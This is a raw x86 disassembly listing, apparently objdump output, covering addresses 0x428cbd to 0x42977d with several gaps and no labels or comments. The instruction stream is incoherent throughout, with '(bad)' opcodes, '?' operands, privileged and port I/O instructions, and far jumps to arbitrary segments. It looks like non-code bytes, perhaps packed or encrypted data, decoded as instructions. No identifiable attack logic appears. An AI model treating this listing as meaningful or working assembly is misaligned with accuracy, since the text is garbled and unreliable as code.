  428cbd:	adc    dh,BYTE PTR [ecx-0x7f]
  428cc0:	es mov ah,0xf6
  428cc3:	rcr    DWORD PTR ds:0x59d69e34,cl
  428cc9:	pusha  
  428cca:	jne    0x428ca0
  428ccc:	loop   0x428c6d
  428cce:	and    al,0x90
  428cd0:	push   es
  428cd1:	add    eax,0xb3f480bd
  428cd6:	aas    
  428cd7:	cli    
  428cd8:	sbb    BYTE PTR [ebx+edi*4],ch
  428cdb:	fs push ebp
  428cdd:	and    al,0x91
  428cdf:	mov    dh,ch
  428ce1:	jge    0x428ccd
  428ce3:	in     eax,0xdb
  428ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ce6:	pop    edi
  428ce7:	in     eax,0xf
  428ce9:	popa   
  428cea:	pop    eax
  428ceb:	fnstsw WORD PTR [ebp-0x5e]
  428cee:	shr    bl,0xae
  428cf1:	test   bh,cl
  428cf3:	inc    ecx
  428cf4:	cmp    ebx,esp
  428cf6:	jp     0x428cd2
  428cf8:	out    0xb2,al
  428cfa:	mov    ah,0xdd
  428cfc:	imul   BYTE PTR [eax+0x1b70a530]
  428d02:	imul   eax,DWORD PTR [ebx+0x42],0xffffffc0
  428d06:	sbb    BYTE PTR [ecx+0x1a],0x7f
  428d0a:	jb     0x428cc2
  428d0c:	pop    es
  428d0d:	int3   
  428d0e:	jge    0x428d08
	...
  428d74:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0x1b77
  428d82:	sub    BYTE PTR [edi+0x58],0xb4
  428d86:	add    DWORD PTR [eax],eax
  428d88:	add    al,0x1
  428d8a:	add    BYTE PTR [eax],al
  428d8c:	push   edx
  428d8d:	test   al,0x4c
  428d8f:	lea    esp,ds:0x5598304f
  428d95:	pop    edi
  428d96:	rol    edi,0xef
  428d99:	sbb    esp,esi
  428d9b:	or     DWORD PTR [ebx-0x15f79e7c],esp
  428da1:	aam    0x3
  428da3:	push   edi
  428da4:	jb     0x428dc4
  428da6:	sbb    BYTE PTR [ecx-0x1ee9c93a],bh
  428dac:	ja     0x428dca
  428dae:	inc    esi
  428daf:	inc    esp
  428db0:	xchg   ebp,eax
  428db1:	add    eax,0xe1189785
  428db6:	test   eax,0xb455bf3a
  428dbb:	xlat   BYTE PTR ds:[ebx]
  428dbc:	sbb    DWORD PTR [eax-0x2d],0xf
  428dc0:	ss add eax,0x9e135e32
  428dc7:	add    bh,BYTE PTR [ebp-0x45]
  428dca:	outs   dx,BYTE PTR ds:[esi]
  428dcb:	push   es
  428dcc:	(bad)  
  428dcd:	cmp    bh,BYTE PTR [edx+edi*4+0x6350e807]
  428dd4:	ins    BYTE PTR es:[edi],dx
  428dd5:	xchg   ecx,edx
  428dd7:	mov    ecx,0xfd418206
  428ddc:	mov    cl,0x59
  428dde:	test   eax,0x184bc024
  428de3:	dec    esp
  428de4:	bound  edi,QWORD PTR ds:0x1ec21c91
  428dea:	imul   edi,DWORD PTR [edi-0x5d],0x25464d39
  428df1:	pop    ecx
  428df2:	sub    BYTE PTR [ecx-0x7c7a864a],bh
  428df8:	cmp    ah,ch
  428dfa:	push   0x81934b3f
  428dff:	push   ecx
  428e00:	jmp    0xe5813e05
  428e05:	loopne 0x428e80
  428e07:	popf   
  428e08:	sar    dl,0x2d
  428e0b:	xor    DWORD PTR [eax+0x25],0x5fb52342
  428e12:	sbb    al,0xf6
  428e14:	(bad)  [edi+0x72]
  428e17:	scas   al,BYTE PTR es:[edi]
  428e18:	std    
  428e19:	popf   
  428e1a:	icebp  
  428e1b:	gs mov cs,esi
  428e1e:	shl    BYTE PTR [edx-0x44],cl
  428e21:	scas   eax,DWORD PTR es:[edi]
  428e22:	xor    al,0x9a
  428e24:	stos   BYTE PTR es:[edi],al
  428e25:	inc    ebp
  428e26:	rdmsr  
  428e28:	push   0xb8eaefdf
  428e2d:	add    al,BYTE PTR [esi+0x2f5f1cc9]
  428e33:	imul   edi,edx,0x42
  428e36:	dec    esp
  428e37:	sahf   
  428e38:	cwde   
  428e39:	outs   dx,DWORD PTR ds:[esi]
  428e3a:	pop    ebp
  428e3b:	popf   
  428e3c:	ss mov ebx,0x18d4563b
  428e42:	fstp   TBYTE PTR [esi]
  428e44:	int    0x4f
  428e46:	pop    edx
  428e47:	push   esp
  428e48:	ret    0x16bc
  428e4b:	pop    eax
  428e4c:	js     0x428e09
  428e4e:	or     al,0x1a
  428e50:	clc    
  428e51:	aas    
  428e52:	cmp    al,0x8b
  428e54:	les    edi,FWORD PTR [ebx]
  428e56:	push   edx
  428e57:	cmc    
  428e58:	push   ss
  428e59:	jno    0x428dff
  428e5b:	repnz ficomp DWORD PTR [ebp-0x55084125]
  428e62:	int    0x77
  428e64:	fs mov ah,0x1f
  428e67:	sub    eax,0xf364eea7
  428e6c:	fstp   DWORD PTR [ecx+0x5aaa1b16]
  428e72:	imul   esi,DWORD PTR [ebp+0x7a],0xa
  428e76:	(bad)  
  428e77:	xchg   edx,eax
  428e78:	lods   al,BYTE PTR ds:[esi]
  428e79:	ret    
  428e7a:	cmp    ah,BYTE PTR [esi]
  428e7c:	cld    
  428e7d:	imul   DWORD PTR [eax+ebx*1+0x4]
  428e81:	inc    eax
  428e82:	add    DWORD PTR [ebx+eax*4-0x38],ebx
  428e86:	add    cl,BYTE PTR [eax+0x54]
  428e89:	mov    esi,0x799e1bf5
  428e8e:	push   eax
  428e8f:	sbb    al,BYTE PTR [eax]
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x9d
  428f01:	push   ds
  428f02:	xor    BYTE PTR [ebx+0x1b55c],al
  428f08:	add    al,0x1
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	stos   BYTE PTR es:[edi],al
  428f0d:	lahf   
  428f0e:	cmp    BYTE PTR [ecx-0x7d002839],0x3
  428f15:	pop    ebp
  428f16:	sub    eax,DWORD PTR [ebp+0x6acb5436]
  428f1c:	nop
  428f1d:	imul   ecx,DWORD PTR [ebx-0x41],0xd828cdbf
  428f24:	mov    eax,ds:0xdc479819
  428f29:	xchg   DWORD PTR [ebx+edi*8-0x3f],ebp
  428f2d:	xchg   esp,eax
  428f2e:	xchg   ebx,eax
  428f2f:	int3   
  428f30:	fidivr WORD PTR [edi-0x68ae8d57]
  428f36:	mov    BYTE PTR [edx-0x70a01449],dh
  428f3c:	jg     0x428f8b
  428f3e:	pop    es
  428f3f:	mov    esi,DWORD PTR [eax+0x3c]
  428f42:	adc    eax,DWORD PTR [edi+0x55ca34b]
  428f48:	cmp    DWORD PTR [edi+0x501bab83],eax
  428f4e:	mov    esi,0xab99fd8d
  428f53:	jmp    0x51a4:0x8bfc5510
  428f5a:	les    ecx,FWORD PTR [esi]
  428f5c:	sbb    bl,BYTE PTR [eax-0x53d9d604]
  428f62:	lock scas al,BYTE PTR es:[edi]
  428f64:	cmp    ebp,DWORD PTR [edx+0x3c]
  428f67:	jnp    0x428fe0
  428f69:	jl     0x428f89
  428f6b:	pushf  
  428f6c:	add    al,0xca
  428f6e:	daa    
  428f6f:	popa   
  428f70:	ret    0x56aa
  428f73:	jg     0x428f35
  428f75:	outs   dx,BYTE PTR ds:[esi]
  428f76:	test   eax,0xc6cdb79c
  428f7b:	cmc    
  428f7c:	imul   esp,DWORD PTR [edx-0x1af4addf],0x85816ac5
  428f86:	int    0xad
  428f88:	mov    al,0xeb
  428f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f8b:	or     bl,cl
  428f8d:	fadd   DWORD PTR [ebp-0x56e9426a]
  428f93:	repnz cmp edx,ecx
  428f96:	aad    0x2
  428f98:	push   edx
  428f99:	jmp    0x428f1e
  428f9b:	fmul   st(4),st
  428f9d:	fs sub eax,0x1ec0a119
  428fa3:	jno    0x428fc5
  428fa5:	hlt    
  428fa6:	imul   esp,DWORD PTR [edi+0x67],0xffffff80
  428faa:	scas   al,BYTE PTR es:[edi]
  428fab:	bound  esi,QWORD PTR ds:0xc3d99673
  428fb1:	pop    ds
  428fb2:	add    eax,0x84a5538b
  428fb7:	call   0xfc6d:0xa3112781
  428fbe:	lods   al,BYTE PTR ds:[esi]
  428fbf:	int    0xfa
  428fc1:	retf   0x5567
  428fc4:	icebp  
  428fc5:	mov    ch,0x53
  428fc7:	mov    dl,0xec
  428fc9:	xor    bh,cl
  428fcb:	test   al,0x7c
  428fcd:	dec    edx
  428fce:	mov    bl,0x33
  428fd0:	xchg   edi,eax
  428fd1:	push   edi
  428fd2:	jecxz  0x428f56
  428fd4:	ds jecxz 0x428fc5
  428fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428fd8:	mov    cl,0x26
  428fda:	test   BYTE PTR [esi+esi*1],bh
  428fdd:	add    al,0x4
  428fdf:	in     al,dx
  428fe0:	mov    cl,0x13
  428fe2:	dec    edi
  428fe3:	fbld   TBYTE PTR [eax+0x1d]
  428fe6:	xor    ebp,DWORD PTR [esi-0x300448b4]
  428fec:	outs   dx,BYTE PTR ds:[esi]
  428fed:	sub    al,0x61
  428fef:	cdq    
  428ff0:	cld    
  428ff1:	cs pop ecx
  428ff3:	lods   al,BYTE PTR ds:[esi]
  428ff4:	das    
  428ff5:	(bad)  
  428ff6:	fistp  QWORD PTR [edx-0x76a9ebfc]
  428ffc:	mov    esi,0x944d49d2
  429001:	jge    0x428fe8
  429003:	fwait
  429004:	xor    esi,esp
  429006:	in     al,dx
  429007:	dec    ebx
  429008:	jl     0x428fa3
  42900a:	mov    dl,0xe2
  42900c:	das    
  42900d:	and    BYTE PTR [edx+0x50],0x0
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x33fc7b77
  429081:	pop    esi
  429082:	xor    dl,BYTE PTR [eax+eiz*2+0x40001b6]
  429089:	add    DWORD PTR [eax],eax
  42908b:	add    BYTE PTR [esi-0x7c],al
  42908e:	sar    BYTE PTR [ecx+0x3b2f56e0],0x1e
  429095:	test   al,0x97
  429097:	push   eax
  429098:	push   0x5d
  42909a:	jne    0x4290f5
  42909c:	cwde   
  42909d:	or     BYTE PTR [ebx+0x140f71ac],0x7c
  4290a4:	test   al,0xe3
  4290a6:	or     edx,DWORD PTR ds:0xd17df1e
  4290ac:	mov    ecx,0x4fa2de56
  4290b1:	ret    
  4290b2:	push   eax
  4290b3:	add    eax,0x6fc9a05
  4290b8:	mov    ss,WORD PTR [ecx+eiz*4]
  4290bb:	retf   
  4290bc:	out    0x8b,al
  4290be:	retf   
  4290bf:	cmp    esi,edx
  4290c1:	fbstp  TBYTE PTR [esi]
  4290c3:	mov    al,0x34
  4290c5:	sub    bl,ah
  4290c7:	dec    dx
  4290c9:	jmp    edi
  4290cb:	lock sbb eax,0x26b6bcd9
  4290d1:	sbb    edi,0x7a10176e
  4290d7:	mov    ch,0x44
  4290d9:	mov    bl,0xb6
  4290db:	push   edx
  4290dc:	mov    edx,0x76a662c6
  4290e1:	sub    eax,0xc86ada1a
  4290e6:	shr    DWORD PTR [edi+0x4],1
  4290e9:	and    eax,0xedfa5b22
  4290ee:	pop    ebp
  4290ef:	or     ebp,edi
  4290f1:	inc    ebp
  4290f2:	mov    ch,0xa0
  4290f4:	mov    edi,0x53645f10
  4290f9:	mov    eax,0x2162047d
  4290fe:	inc    edi
  4290ff:	sbb    eax,0x22d432b6
  429104:	mov    bl,0xb9
  429106:	sbb    ecx,0x5b
  429109:	jnp    0x4290a1
  42910b:	xchg   edi,eax
  42910c:	aaa    
  42910d:	mov    ds:0x1bce1f43,eax
  429112:	xchg   ebp,eax
  429113:	loop   0x42912f
  429115:	sti    
  429116:	fisttp WORD PTR [ecx+0x39889c89]
  42911c:	mov    ?,ebp
  42911e:	outs   dx,BYTE PTR ds:[esi]
  42911f:	lds    eax,FWORD PTR [edx+edi*1+0x5b9a36e5]
  429126:	sub    DWORD PTR [esi+0x6cdae48a],0x8993d126
  429130:	push   edx
  429131:	jecxz  0x4291a9
  429133:	sub    edi,eax
  429135:	mov    al,0x5d
  429137:	mov    bl,0xfd
  429139:	dec    ecx
  42913a:	in     al,dx
  42913b:	pop    es
  42913c:	push   ds
  42913d:	int3   
  42913e:	xchg   ecx,eax
  42913f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429140:	inc    ebp
  429141:	pop    ebp
  429142:	xchg   ecx,eax
  429143:	jmp    0xd57a:0x6e24e0d4
  42914a:	sbb    al,0xab
  42914c:	sbb    DWORD PTR [ecx+0x71],0xb
  429150:	cmp    eax,0xfd7baf71
  429155:	scas   al,BYTE PTR es:[edi]
  429156:	imul   ebp,DWORD PTR [edx-0x4a5b3c8b],0x1
  42915d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42915e:	std    
  42915f:	sub    ebp,DWORD PTR [edi-0x664bcf4]
  429165:	xchg   esp,eax
  429166:	int3   
  429167:	aaa    
  429168:	cs addr16 fdivr st,st(1)
  42916c:	mov    ebx,0x3eba7069
  429171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429172:	fninit 
  429174:	fwait
  429175:	loop   0x4291cd
  429177:	dec    dh
  429179:	pusha  
  42917a:	mov    dh,bl
  42917c:	repnz shl DWORD PTR [esi+ebp*8-0x53b7db1],cl
  429184:	mov    eax,ds:0xe58755df
  429189:	iret   
  42918a:	jb     0x42919b
  42918c:	add    esp,ebx
  42918e:	inc    edi
  42918f:	mov    es,WORD PTR [eax]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [edx+ebx*1+0x646f89f3],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ecx-0x5c824b0b],ah
  429211:	je     0x429283
  429213:	ds xor eax,0xde6c5324
  429219:	lods   al,BYTE PTR ds:[esi]
  42921a:	mov    dl,0x5e
  42921c:	sbb    al,0x4c
  42921e:	mov    bl,BYTE PTR [eax+0x1ea8b2f7]
  429224:	push   edx
  429225:	xor    BYTE PTR [ebp-0x13],bh
  429228:	pushf  
  429229:	ret    
  42922a:	push   ds
  42922b:	call   0x3226:0xb57ddefc
  429232:	(bad)  
  429233:	sbb    cl,BYTE PTR [ebx-0x44e42475]
  429239:	in     eax,dx
  42923a:	call   0x4440:0x1a6c14d2
  429241:	fadd   DWORD PTR [esi-0x22dfd7c4]
  429247:	inc    esp
  429248:	fisttp WORD PTR [eax+0x236f0f17]
  42924e:	fstp   QWORD PTR [edx]
  429250:	inc    edx
  429251:	rol    dl,1
  429253:	add    ebx,0x55b0355c
  429259:	mov    ds:0x8c62534e,eax
  42925e:	push   ss
  42925f:	pop    ebp
  429260:	out    0x5c,al
  429262:	shl    DWORD PTR [ebx+0x1ab3543c],1
  429268:	add    al,0x53
  42926a:	mov    bh,0xa4
  42926c:	inc    esp
  42926d:	mov    dh,0x87
  42926f:	xor    eax,0xf1b1af63
  429274:	data16 adc bl,BYTE PTR [edi]
  429277:	add    eax,0x1abce505
  42927c:	push   ebx
  42927d:	popf   
  42927e:	clc    
  42927f:	mov    ebx,0xe150eac7
  429284:	inc    eax
  429285:	cmp    al,0xd1
  429287:	adc    DWORD PTR [ebp-0x5d48d01c],eax
  42928d:	es std 
  42928f:	jmp    0x73407084
  429294:	sbb    eax,0xb3760d77
  429299:	add    eax,0xb4661f0
  42929e:	adc    DWORD PTR [esi+ebx*8+0x5ce3e792],edx
  4292a5:	cmp    DWORD PTR [ebx+0x44],esi
  4292a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292a9:	in     al,dx
  4292aa:	mov    ebp,DWORD PTR [ebp-0x7aff4663]
  4292b0:	(bad)  
  4292b1:	out    dx,eax
  4292b2:	xor    eax,DWORD PTR [ebp-0x1b]
  4292b5:	aas    
  4292b6:	xchg   ecx,eax
  4292b7:	pop    DWORD PTR [edx-0x16cb986f]
  4292bd:	dec    ecx
  4292be:	or     eax,DWORD PTR [edx+0x69]
  4292c1:	adc    bh,al
  4292c3:	pop    ebp
  4292c4:	imul   edi,DWORD PTR [edx+0x61],0x535755f1
  4292cb:	xor    BYTE PTR [ebp+0x5d89a9dc],0xff
  4292d2:	mov    cl,0xbe
  4292d4:	stc    
  4292d5:	mov    edx,0x6dacc325
  4292da:	mov    bl,0x2e
  4292dc:	inc    esp
  4292dd:	(bad)  
  4292de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292df:	adc    cl,cl
  4292e1:	xor    DWORD PTR [eax+edi*2],0x36d3fd39
  4292e8:	dec    edx
  4292e9:	push   ds
  4292ea:	xchg   ebp,eax
  4292eb:	push   ss
  4292ec:	cmc    
  4292ed:	sub    BYTE PTR [ecx-0x2f],dh
  4292f0:	add    BYTE PTR ds:0x56d6b788,0xae
  4292f7:	mov    cl,0xd9
  4292f9:	xor    DWORD PTR [ebp-0x263af1c8],ecx
  4292ff:	call   0xe82b:0x699ee1bb
  429306:	lea    ecx,[ebx-0x21]
  429309:	pop    ss
  42930a:	cs (bad) 
  42930c:	in     al,0x8f
  42930e:	and    ebx,DWORD PTR [eax+0x0]
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x4d
  429381:	push   esi
  429382:	cmp    al,0x43
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    BYTE PTR ds:0x46b198f2,dh
  429391:	pop    ebx
  429392:	std    
  429393:	push   edx
  429394:	hlt    
  429395:	data16 adc al,0xdd
  429398:	das    
  429399:	mov    al,0x29
  42939b:	or     al,0xcf
  42939d:	pop    edi
  42939e:	into   
  42939f:	or     ecx,DWORD PTR [esi]
  4293a1:	inc    esp
  4293a2:	pop    ds
  4293a3:	xor    DWORD PTR [edi+eax*8-0x3794c402],ebx
  4293aa:	in     eax,0x61
  4293ac:	xor    eax,0x3e4a563e
  4293b1:	std    
  4293b2:	mov    WORD PTR [ecx+0x51],gs
  4293b5:	xchg   edi,eax
  4293b6:	jge    0x429367
  4293b8:	cmc    
  4293b9:	xchg   edi,eax
  4293ba:	jg     0x42942a
  4293bc:	or     eax,0xf2147dee
  4293c1:	jne    0x429357
  4293c3:	out    dx,al
  4293c4:	cld    
  4293c5:	fmul   QWORD PTR [edi-0x7a]
  4293c8:	es sbb eax,0x6f95c4f5
  4293ce:	add    DWORD PTR [eax+edi*4-0x627bc793],edi
  4293d5:	cwde   
  4293d6:	jbe    0x4293a7
  4293d8:	je     0x42942d
  4293da:	jns    0x42938d
  4293dc:	loope  0x4293be
  4293de:	aam    0xd
  4293e0:	hlt    
  4293e1:	cmp    esi,DWORD PTR [edi+0x6cadf976]
  4293e7:	jge    0x4293f2
  4293e9:	(bad)  
  4293ea:	(bad)  
  4293eb:	popf   
  4293ec:	ss mov edi,0x3bbc0e02
  4293f2:	push   0x8
  4293f4:	inc    ebp
  4293f5:	jbe    0x4293d2
  4293f7:	push   eax
  4293f8:	mul    DWORD PTR ds:0xa3dba7d5
  4293fe:	mov    eax,0xf14d02c3
  429403:	cmp    DWORD PTR [esi],0xfffffffd
  429406:	xor    ch,BYTE PTR [esi*2-0x2e271134]
  42940d:	std    
  42940e:	lods   eax,DWORD PTR ds:[esi]
  42940f:	(bad)  
  429410:	xlat   BYTE PTR ds:[ebx]
  429411:	imul   eax,esp,0x6277b5ed
  429417:	mov    WORD PTR [esi-0x68],?
  42941a:	outs   dx,DWORD PTR ds:[esi]
  42941b:	ins    BYTE PTR es:[edi],dx
  42941c:	repnz pop es
  42941e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42941f:	jns    0x4293b9
  429421:	adc    eax,0x7a3b88ec
  429426:	popa   
  429427:	iret   
  429428:	(bad)  
  429429:	loopne 0x429486
  42942b:	push   ebp
  42942c:	ins    DWORD PTR es:[edi],dx
  42942d:	jbe    0x429443
  42942f:	repnz xchg esp,eax
  429431:	popf   
  429432:	push   esp
  429433:	ffree  st(7)
  429435:	and    al,0x9a
  429437:	jns    0x42940a
  429439:	ins    BYTE PTR es:[edi],dx
  42943a:	sub    eax,0x9b971d86
  42943f:	test   BYTE PTR [esi+eax*4],dl
  429442:	jo     0x429400
  429444:	mov    gs,WORD PTR [ebx+0xc]
  429447:	or     al,0x47
  429449:	repnz sti 
  42944b:	sbb    eax,0xb7927fe3
  429450:	or     BYTE PTR [ebx-0x32c24d8b],bh
  429456:	fs pusha 
  429458:	fild   QWORD PTR [eax-0x4f63daaa]
  42945e:	xchg   ebx,eax
  42945f:	dec    edx
  429460:	mov    ds:0xd0aad4c,al
  429465:	or     eax,0x22b4d58c
  42946a:	push   ds
  42946b:	add    al,0xfc
  42946d:	imul   edx,DWORD PTR [ebx+0x717572c3],0xffffffa6
  429474:	dec    esi
  429475:	mov    eax,0xc9797e92
  42947a:	sub    DWORD PTR [eax],esi
  42947c:	mov    esp,0x8c489191
  429481:	loopne 0x42948a
  429483:	adc    al,0x51
  429485:	js     0x4294a1
  429487:	inc    esi
  429488:	sbb    al,0x50
  42948a:	mov    DWORD PTR ds:0xd79de52f,eax
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x583cffea],dx
  429503:	mov    edi,0x1b96c
  429508:	add    al,0x1
  42950a:	add    BYTE PTR [eax],al
  42950c:	adc    edx,DWORD PTR [ebx+0x35]
  42950f:	pop    edx
  429510:	pop    esi
  429511:	cs (bad) 
  429514:	mov    ds:0xac7e9b81,eax
  429519:	setns  BYTE PTR [edx-0x5c23b9d0]
  429520:	dec    eax
  429521:	aam    0xf2
  429523:	ss push eax
  429525:	or     al,0x54
  429527:	pop    ebp
  429528:	adc    dh,BYTE PTR [ebx]
  42952a:	arpl   WORD PTR [ecx+0x5c],ax
  42952d:	shl    BYTE PTR [edi-0x593e63a7],1
  429533:	(bad)  
  429534:	push   edx
  429535:	addr16 in eax,0xa7
  429538:	jl     0x429570
  42953a:	push   edi
  42953b:	and    BYTE PTR [edi+0x793b18ae],cl
  429541:	pop    ds
  429542:	cmp    ebx,DWORD PTR [ebx]
  429544:	(bad)  
  429545:	aas    
  429546:	call   0x7246:0xb2a91fa1
  42954d:	fs in  al,dx
  42954f:	test   al,0x88
  429551:	xchg   esi,eax
  429552:	dec    ebx
  429553:	sbb    al,0x6c
  429555:	std    
  429556:	call   DWORD PTR [esi-0x6efc9d45]
  42955c:	mov    ecx,DWORD PTR ds:0x3f488f0c
  429562:	retf   0x1190
  429565:	jnp    0x42957d
  429567:	(bad)  
  429568:	pop    eax
  429569:	shr    DWORD PTR ss:[eax],1
  42956c:	cli    
  42956d:	pop    edi
  42956e:	mov    edi,0x8d158f69
  429573:	scas   al,BYTE PTR es:[edi]
  429574:	or     al,0xa1
  429576:	icebp  
  429577:	outs   dx,BYTE PTR ds:[esi]
  429578:	mov    edi,0x978ced8f
  42957d:	shl    edx,cl
  42957f:	loopne 0x429517
  429581:	lds    esi,FWORD PTR [esi+0x76]
  429584:	mov    ah,0x5a
  429586:	mov    es,WORD PTR [ebx]
  429588:	bound  edi,QWORD PTR [edx+0x2b2cace7]
  42958e:	inc    edx
  42958f:	pusha  
  429590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429591:	aad    0x52
  429593:	fs sub al,0xc6
  429596:	or     al,0x6a
  429598:	cli    
  429599:	out    dx,eax
  42959a:	dec    ecx
  42959b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42959d:	(bad)  
  42959e:	mov    ah,0x60
  4295a0:	out    0x74,al
  4295a2:	cdq    
  4295a3:	xchg   DWORD PTR [edi+0x6e7f728a],esp
  4295a9:	test   DWORD PTR [ebp+0x2702827c],ebx
  4295af:	or     ecx,ebp
  4295b1:	xor    bh,BYTE PTR [esi+edi*1-0x4fea3443]
  4295b8:	pop    ebp
  4295b9:	mul    DWORD PTR [ebx+0x552a58dc]
  4295bf:	outs   dx,BYTE PTR ds:[esi]
  4295c0:	pop    esi
  4295c1:	nop
  4295c2:	pop    es
  4295c3:	jnp    0x429562
  4295c5:	mov    eax,0x56b0da61
  4295ca:	xchg   edi,eax
  4295cb:	rol    DWORD PTR [ebx+0x74],1
  4295ce:	sub    DWORD PTR [edx-0x1ac7486b],0x816924ad
  4295d8:	and    al,0xad
  4295da:	or     eax,0xc32baf1c
  4295df:	sub    BYTE PTR [edi-0x3e],al
  4295e2:	mov    esp,0x38364e26
  4295e7:	inc    esi
  4295e8:	push   eax
  4295e9:	pop    ecx
  4295ea:	shr    ah,1
  4295ec:	dec    ebp
  4295ed:	ja     0x4295fe
  4295ef:	mov    bh,0xef
  4295f1:	imul   eax,DWORD PTR [ecx],0x4b
  4295f4:	fsubr  DWORD PTR [edi+eiz*4+0x66]
  4295f8:	pop    esi
  4295f9:	scas   al,BYTE PTR es:[edi]
  4295fa:	enter  0x4d2a,0x66
  4295fe:	jb     0x42959f
  429600:	inc    ecx
  429601:	mov    ebp,0x3a57d1dc
  429606:	ficom  DWORD PTR [edx-0x7f2a321e]
  42960c:	push   ds
  42960d:	scas   eax,DWORD PTR es:[edi]
  42960e:	pop    ss
  42960f:	push   0x0
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	cwde   
  429681:	mov    ecx,0xba70be1b
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	pop    esi
  42968d:	retf   
  42968e:	jns    0x429642
  429690:	sub    ah,BYTE PTR [eax]
  429692:	scas   eax,DWORD PTR es:[edi]
  429693:	adc    esi,esi
  429695:	xor    al,0x75
  429697:	mov    eax,0x187faeff
  42969c:	mov    ds:0xb8940c20,eax
  4296a1:	add    al,0x8f
  4296a3:	mov    cl,0x83
  4296a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296a6:	jg     0x429724
  4296a8:	pop    es
  4296a9:	add    DWORD PTR [ebx-0x68],ebp
  4296ac:	aas    
  4296ad:	frstor [edi+0xfdc549b]
  4296b3:	and    al,0xee
  4296b5:	loope  0x42972e
  4296b7:	mov    ebp,0x8977b4d
  4296bc:	into   
  4296bd:	add    ah,bl
  4296bf:	lock aas 
  4296c1:	repnz mov al,0x9f
  4296c4:	sbb    ebx,DWORD PTR [esi]
  4296c6:	adc    eax,0xa040aded
  4296cb:	std    
  4296cc:	(bad)  
  4296cd:	jmp    0xe03f6c94
  4296d2:	rcl    BYTE PTR [esp+eiz*4+0x23df82b4],1
  4296d9:	and    BYTE PTR [edi+0x2d66a13c],ah
  4296df:	push   cs
  4296e0:	mov    ds:0x46fc1fb8,al
  4296e5:	addr16 test al,0x22
  4296e8:	hlt    
  4296e9:	sub    al,0xb4
  4296eb:	rol    DWORD PTR [esi],1
  4296ed:	lds    ebp,FWORD PTR [edi+0x72]
  4296f0:	sub    al,0xfc
  4296f2:	int    0x1a
  4296f4:	js     0x4296a7
  4296f6:	mov    BYTE PTR [esi+0x3a],al
  4296f9:	out    0x1f,eax
  4296fb:	(bad)  
  4296fc:	rol    BYTE PTR [eax-0x66904a8b],cl
  429702:	xor    eax,0xa2f1bb98
  429707:	shl    DWORD PTR [ebp+0xb],cl
  42970a:	fidiv  DWORD PTR [ebp-0x7114345d]
  429710:	fisub  WORD PTR [ecx]
  429712:	ins    DWORD PTR es:[edi],dx
  429713:	adc    DWORD PTR [ebp+0x7bc75ace],0x83e8a656
  42971d:	aaa    
  42971e:	and    DWORD PTR [ecx+0x2c25670],ecx
  429724:	daa    
  429725:	add    eax,0xb3c4dbda
  42972a:	int    0xa
  42972c:	dec    edx
  42972d:	in     eax,0x2
  42972f:	push   esp
  429730:	enter  0x885b,0x3f
  429734:	mov    dl,0xba
  429736:	retf   0x6fae
  429739:	xchg   esp,eax
  42973a:	xchg   esi,eax
  42973b:	push   0xfffffff1
  42973d:	lods   al,BYTE PTR ds:[esi]
  42973e:	push   ss
  42973f:	pop    esp
  429740:	mov    al,ds:0x1b6c51b6
  429745:	das    
  429746:	retf   0x5897
  429749:	push   0xffffffaa
  42974b:	daa    
  42974c:	xchg   esi,eax
  42974d:	mov    ch,0xf0
  42974f:	adc    ch,ch
  429751:	sbb    edi,ecx
  429753:	xchg   ecx,eax
  429754:	jl     0x4296dc
  429756:	add    eax,0xbb0ae0b1
  42975b:	or     cl,BYTE PTR [esi]
  42975d:	pop    esi
  42975e:	fwait
  42975f:	add    al,0xc4
  429761:	call   0x87956ce6
  429766:	rcr    BYTE PTR [edi],0xa8
  429769:	add    DWORD PTR [eax-0x3a5e17b2],esi
  42976f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429770:	push   cs
  429771:	fistp  QWORD PTR [ebp-0x75]
  429774:	sbb    BYTE PTR [edx+eiz*8],ch
  429777:	in     al,0x53
  429779:	fist   DWORD PTR [eax+ebx*1+0x6e]
  42977d:	push   edi
